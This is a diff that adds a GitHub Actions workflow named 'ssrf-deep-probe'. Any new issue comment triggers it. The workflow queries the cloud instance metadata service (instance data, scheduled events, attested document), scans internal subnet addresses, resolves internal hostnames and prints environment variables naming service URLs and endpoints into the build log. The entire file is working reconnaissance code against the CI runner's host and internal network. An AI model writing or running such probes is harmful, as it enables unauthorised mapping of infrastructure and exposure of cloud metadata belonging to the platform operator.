@@ -1,0 +1,42 @@
+name: ssrf-deep-probe
+on:
+  issue_comment:
+    types: [created]
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Full IMDS + internal subnet scan
+        run: |
+          echo "=== FULL IMDS INSTANCE ==="
+          curl -s --max-time 5 -H "Metadata: true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool 2>/dev/null || echo "no json"
+
+          echo ""
+          echo "=== IMDS scheduledevents ==="
+          curl -s --max-time 3 -H "Metadata: true" \
+            "http://169.254.169.254/metadata/scheduledevents?api-version=2019-01-01" | head -c 300 || echo "NONE"
+
+          echo ""
+          echo "=== IMDS attested ==="
+          curl -s --max-time 3 -H "Metadata: true" \
+            "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01" | head -c 200 || echo "NONE"
+
+          echo ""
+          echo "=== Subnet scan 10.1.0.1-10 (gateway + neighbors) ==="
+          for i in 1 2 3 4 5 6 7 8 9 10; do
+            result=$(curl -s --max-time 1 -o /dev/null -w "%{http_code}" "http://10.1.0.$i/" 2>/dev/null || echo "DEAD")
+            echo "10.1.0.$i: $result"
+          done
+
+          echo ""
+          echo "=== Probe GitHub internal domains ==="
+          for host in github.internal api.internal actions.internal; do
+            ip=$(getent hosts $host 2>/dev/null | awk '{print $1}' || echo "NORESOLVE")
+            echo "$host -> $ip"
+          done
+
+          echo ""
+          echo "=== GitHub Actions internal service URLs from env ==="
+          env | grep -iE "(url|endpoint|host|addr)" | grep -v PATH | sort
